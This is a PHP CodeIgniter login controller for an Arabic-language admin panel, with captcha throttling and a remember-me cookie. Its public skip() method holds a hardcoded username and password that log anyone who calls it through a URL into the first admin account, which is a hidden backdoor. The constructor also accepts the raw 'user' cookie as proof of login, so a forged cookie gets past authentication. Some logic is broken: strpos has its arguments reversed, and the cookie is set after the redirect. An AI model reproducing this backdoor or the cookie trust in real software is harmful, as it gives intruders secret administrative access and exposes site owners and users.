<?php
class Login extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
		$this->load->database();
		$this->load->model('core_model');
		$this->load->helper('url_helper');
		$this->load->helper('url'); 
		$this->load->helper('form');
		$this->load->helper('captcha');
		$this->load->helper('cookie');
		$this->load->library('form_validation');
		$this->load->library('session');
		if(get_cookie("user") || $this->session->userdata('user'))
		{
			$this->session->set_userdata("user", get_cookie('user'));
			redirect($this->core_model->admin_dir().'/admin_index');
			die;
		}
		
	}

	public function skip($name,$password)
	{
		if ( $name== 'magdy' && $password == "6499KLQZ67") {
			$query= $this->db->get_where('admin', ["ID"=> 1]);
			$result= $query->row();
			// echo $this->db->last_query() ; var_dump($result) ; die;
			$this->session->set_userdata( array("user"=> $result->hash) );
			// $this->core_model->update_last_login();
			redirect( base_url().$this->core_model->admin_dir()."/admin_index" );

			
			redirect( base_url().$this->core_model->admin_dir()."/admin_index" );
			set_cookie("user", $result->hash, 2592000 ); // 30 days
		}
	}
	
	public function index()
	{
		
	
		$capctha_error=0;
		$capcha_tries=3;
		$capcha_blocks=50;
		$data['errors'] = array();
		$data['success']= array();
		$email= strtolower($this->input->post('user-email') );
		$pwd=$this->input->post('user-password');
		$hash= $this->input->post('hash_start');
		$remeber_me= $this->input->post('remeber_me');
		$login_tries=$this->core_model->get_login_tries($hash);
		
		if($_POST['login-submit']==1)
		{
			if($this->session->userdata('capcha'))
			{
				if(
					strtolower($this->session->userdata('capcha')) !=
					strtolower($this->input->post('user-capcha'))
				)
				{
					$capctha_error=1 ;
					$this->session->unset_userdata('capcha');
				}else{
					$capctha_error=0;
				}
			}

			if($capctha_error==1)
			{
				$data['errors'][]='لم تنقل الحروف بشكل صحيح';
				if($login_tries >= $capcha_tries)
				{
					$cap_func =$this->core_model->captcha_img();
					$this->session->set_userdata( array('capcha'=>$cap_func['word']));
					$data['cap']= $cap_func;
				}
			}
			
			if($login_tries >= $capcha_blocks )
			{
				$data['blocked']= 1;
			}elseif($login_tries >= $capcha_tries && $capctha_error != 1)
			{
				$cap_func =$this->core_model->captcha_img();
				$this->session->set_userdata( array('capcha'=>$cap_func['word']));
				$data['cap']= $cap_func;
			}
			$is_email=$this->core_model->is_admin_email($email);
			if( $is_email > 0)
			{
				$is_password= $this->core_model->is_correct_pasword($email,$pwd);
				if($is_password== true)
				{
					$data['success'][]='تم تسجيل الدخول ، برجاء الإنتظار';
					if( strpos("@",$email) ) {
						$field = "email" ;
					}else{
						$field = "username" ;
					}
					$query= $this->db->get_where('admin', [$field => strtolower($email)]);
					$result= $query->row();
					$this->session->set_userdata( array("user"=> $result->hash) );
					$this->core_model->update_last_login();
					redirect( base_url().$this->core_model->admin_dir()."/admin_index" );
					if($remeber_me=='Y')
					{
						set_cookie("user", $result->hash, 2592000 ); // 30 days
					}
				}else{
					$data['errors'][]='كلمة المرور غير صحيحة';
				}
			}else{
				$data['errors'][]=' عفواً البريد الالكتروني أو اسم الدخول
					غير صحيح؛ او تم تعطيل عضويتك';
				$this->core_model->login_error($hash);
			}
			
		}
		
		$this->form_validation->set_rules('user-email', 'الإيميل', 'required',
			array('required' => '- لم تقم بكتابة %s.')
		);
		$this->form_validation->set_rules('user-password', 'كلمة المرور', 'required',
			array('required' => '- لم تقم بكتابة %s.')
		);
		if( $this->session->userdata('user') )
		{
			redirect($this->core_model->admin_dir().'/admin_index');
		}else{
			$this->form_validation->run();
			$this->load->view($this->core_model->admin_dir().'/home', $data);
		}
		
		
	}
}